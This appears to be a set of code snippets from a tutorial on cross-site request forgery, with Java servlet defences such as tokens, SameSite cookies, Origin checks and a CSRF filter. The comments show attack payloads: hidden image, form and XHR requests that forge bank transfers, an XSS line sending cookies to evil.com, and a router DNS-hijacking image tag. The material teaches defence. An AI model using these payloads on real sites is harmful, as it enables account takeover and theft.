// NORMAL request (you click 'Transfer'):
// POST https://bank.com/transfer
// Cookie: session=abc123    <-- browser adds automatically
// Body: amount=50&to=friend

// CSRF attack (evil page triggers):
// POST https://bank.com/transfer
// Cookie: session=abc123    <-- browser STILL adds automatically!
// Body: amount=1000&to=evil37

// The bank sees BOTH requests with valid session cookie.
// It cannot tell which one YOU actually wanted.

// STEP 3 -- Three ways evil page triggers the request:

// Method 1: Hidden image (GET request)
// <img src="https://bank.com/xfer?amt=1000&to=evil37">

// Method 2: Hidden form (POST request)
// <form action="https://bank.com/xfer" method="POST">
//   <input type="hidden" name="amt" value="1000">
//   <input type="hidden" name="to" value="evil37">
// </form>
// <script>document.querySelector('form').submit();</script>

// Method 3: XMLHttpRequest (POST request)
// var req = new XMLHttpRequest();
// req.open('POST','https://bank.com/xfer');
// req.setRequestHeader('Content-Type',
//   'application/x-www-form-urlencoded');
// req.send('amt=1000&to=evil37');

// When you log in, the server sends:
// Set-Cookie: JSESSIONID=abc123; Path=/; HttpOnly

// From now on, EVERY request to this domain includes:
// Cookie: JSESSIONID=abc123

// This happens automatically for:
// - Links you click
// - Forms you submit
// - Images the page loads
// - AJAX requests
// - Requests triggered by OTHER websites  <-- CSRF!

// The cookie does NOT know who initiated the request.

// SERVER SIDE - Generate and store token:
import java.security.SecureRandom;
import java.util.Base64;

public class CSRFTokenGenerator {
    public static String generateToken() {
        SecureRandom random = new SecureRandom();
        byte[] bytes = new byte[32];
        random.nextBytes(bytes);
        return Base64.getUrlEncoder()
            .withoutPadding()
            .encodeToString(bytes);
    }
}

// In doGet (serving the form):
String token = CSRFTokenGenerator.generateToken();
request.getSession().setAttribute("csrf_token", token);
// Include in form: <input type="hidden" name="csrf_token" value="...">

// In doPost (processing the form):
protected void doPost(HttpServletRequest request,
                      HttpServletResponse response) {
    String sessionToken = (String) request.getSession()
        .getAttribute("csrf_token");
    String formToken = request.getParameter("csrf_token");

    if (sessionToken == null || formToken == null ||
        !MessageDigest.isEqual(
            sessionToken.getBytes(),
            formToken.getBytes())) {
        response.sendError(403, "CSRF validation failed");
        return;
    }

    // Token valid -- process the transfer
    processTransfer(request, response);
}

// Setting SameSite in Java Servlet:
Cookie sessionCookie = new Cookie("JSESSIONID", sessionId);
sessionCookie.setHttpOnly(true);  // Protect from XSS
sessionCookie.setSecure(true);    // HTTPS only
sessionCookie.setPath("/");

// SameSite must be set via header (no direct API in older servlets):
response.setHeader("Set-Cookie",
    "JSESSIONID=" + sessionId +
    "; Path=/; HttpOnly; Secure; SameSite=Lax");

// SameSite=Strict -- maximum protection, blocks all cross-site
// SameSite=Lax    -- blocks POST/AJAX cross-site, allows link clicks
// SameSite=None   -- no protection (requires Secure flag)

// Double Submit Cookie Implementation:

// Step 1: Server sets token as cookie AND in form
String token = CSRFTokenGenerator.generateToken();
Cookie csrfCookie = new Cookie("csrf_token", token);
csrfCookie.setPath("/");
csrfCookie.setHttpOnly(false); // JS needs to read it
csrfCookie.setSecure(true);
response.addCookie(csrfCookie);
// Also embed in form: <input type="hidden" name="csrf_token" value="TOKEN">

// Step 2: Server validates both match
String cookieToken = null;
for (Cookie c : request.getCookies()) {
    if ("csrf_token".equals(c.getName())) cookieToken = c.getValue();
}
String formToken = request.getParameter("csrf_token");
if (!MessageDigest.isEqual(cookieToken.getBytes(), formToken.getBytes())) {
    response.sendError(403, "CSRF rejected");
}

// Checking Origin header:
protected void doPost(HttpServletRequest request,
                      HttpServletResponse response) {
    String origin = request.getHeader("Origin");
    String referer = request.getHeader("Referer");

    // Check Origin first (more reliable)
    if (origin != null) {
        if (!origin.equals("https://bank.com")) {
            response.sendError(403, "Invalid origin");
            return;
        }
    } else if (referer != null) {
        // Fallback to Referer
        if (!referer.startsWith("https://bank.com/")) {
            response.sendError(403, "Invalid referer");
            return;
        }
    } else {
        // Both missing -- reject or allow with extra caution
        response.sendError(403, "Missing origin");
        return;
    }

    // Also validate CSRF token (defence in depth)
    validateCSRFToken(request, response);
}

// NEEDS CSRF protection:
// POST /transfer          -- moves money
// POST /change-password   -- modifies credentials
// POST /change-email      -- modifies account
// DELETE /account         -- destructive action
// POST /post-comment      -- creates content
// PUT /settings           -- modifies preferences
// POST /logout            -- ends session (CSRF logout attack)

// Does NOT need CSRF protection:
// GET /account            -- reads data only
// GET /search?q=...       -- reads data only
// GET /products           -- reads data only

// IMPORTANT: GET should NEVER change state!
// BAD:  GET /transfer?amount=1000&to=evil37
// GOOD: POST /transfer with amount=1000&to=evil37

// XSS Attack (script runs ON your site):
// Attacker injects: <script>document.location=
//   'https://evil.com/steal?cookie='+document.cookie</script>
// Result: Attacker gets session cookie

// CSRF Attack (triggered from DIFFERENT site):
// Attacker's page: <form action="https://your-site.com/transfer"...>
// Result: Browser sends request with victim's cookies
// Attacker CANNOT read the response

// XSS + CSRF combo (worst case):
// 1. Attacker has XSS on your site
// 2. XSS reads CSRF token: document.querySelector('[name=csrf_token]').value
// 3. Attacker includes valid token in forged request
// 4. CSRF protection is bypassed!

import javax.servlet.*;
import javax.servlet.http.*;
import java.io.IOException;
import java.security.MessageDigest;

public class CSRFFilter implements Filter {
    public void doFilter(ServletRequest req, ServletResponse res,
                         FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        HttpSession session = request.getSession();

        // Generate token if not exists
        if (session.getAttribute("csrf_token") == null) {
            session.setAttribute("csrf_token",
                CSRFTokenGenerator.generateToken());
        }

        // Skip safe methods
        String method = request.getMethod().toUpperCase();
        if ("GET".equals(method) || "HEAD".equals(method)) {
            request.setAttribute("csrf_token",
                session.getAttribute("csrf_token"));
            chain.doFilter(req, res);
            return;
        }

        // Validate token for state-changing methods
        String sessionToken = (String) session.getAttribute("csrf_token");
        String requestToken = request.getParameter("csrf_token");

        if (sessionToken == null || requestToken == null ||
            !MessageDigest.isEqual(
                sessionToken.getBytes(), requestToken.getBytes())) {
            response.sendError(403, "CSRF token invalid");
            return;
        }

        // Valid -- regenerate token (one-time use)
        session.setAttribute("csrf_token",
            CSRFTokenGenerator.generateToken());
        chain.doFilter(req, res);
    }
}

// Router CSRF Attack (still common today):
// Attacker embeds in any web page:
// <img src="http://192.168.1.1/admin/dns?primary=evil-dns-ip">
//
// If the user is on their home network and the router
// has default credentials, the DNS is changed.
// ALL traffic now goes through attacker's DNS.
// attacker can redirect bank.com to fake-bank.com
//
// Defence: Change default router password + CSRF tokens

// CLIENT SIDE - Send token as header:
const token = document.querySelector('meta[name=csrf-token]').content;

fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': token   // Custom header
    },
    body: JSON.stringify({ amount: 50, to: 'friend' })
});

// SERVER SIDE - Check header:
String headerToken = request.getHeader("X-CSRF-Token");
String sessionToken = (String) session.getAttribute("csrf_token");
if (!MessageDigest.isEqual(headerToken.getBytes(),
                           sessionToken.getBytes())) {
    response.sendError(403, "Invalid CSRF token");
}

